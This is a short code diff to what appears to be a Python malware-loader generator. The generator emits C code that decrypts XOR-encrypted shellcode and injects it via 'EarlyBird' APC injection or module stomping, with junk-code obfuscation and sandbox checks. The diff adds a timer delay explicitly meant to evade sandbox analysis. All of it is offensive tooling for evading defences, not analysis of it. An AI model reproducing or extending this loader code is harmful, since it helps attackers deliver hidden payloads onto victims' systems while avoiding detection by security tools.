@@ -114,7 +114,7 @@ def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_h
     DWORD WINAPI DoMagic(LPVOID lpParameter)
     {{
         {obfuscator(secrets.choice(array),secrets.choice(size))}
-        {EarlyBird(shellcode_var, ciphertext_split, process_to_inject, time, xor_func, key_var, key_hex,encryption_type,array,size)
+        {EarlyBird(shellcode_var, ciphertext_split, process_to_inject, xor_func, key_var, key_hex,encryption_type,array,size)
             if injection == "EB" else ModuleStomping() if injection == "MS" else ""}
         {obfuscator(secrets.choice(array),secrets.choice(size))}
     }}
@@ -143,6 +143,10 @@ def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_h
             //sandbox check for harddisk size
             gensandbox_drive_size();
             
+             //delay execution to evade sandbox
+            timing_CreateWaitableTimer({time});
+
+
             {obfuscator(secrets.choice(array),secrets.choice(size))}
 
             hThread = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
